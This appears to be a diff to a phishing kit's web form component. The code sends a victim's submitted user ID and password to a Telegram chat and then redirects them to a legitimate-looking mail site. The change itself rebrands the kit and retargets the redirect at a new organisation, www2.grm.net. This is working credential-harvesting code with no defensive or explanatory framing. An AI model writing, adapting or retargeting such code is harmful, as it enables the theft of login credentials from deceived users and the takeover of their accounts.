@@ -108,7 +108,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*mta *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
+        const message = `*grmNet *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -120,7 +120,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://gcimail.vercel.app/");
+        location.replace("https://www2.grm.net/");
       }
     },
 
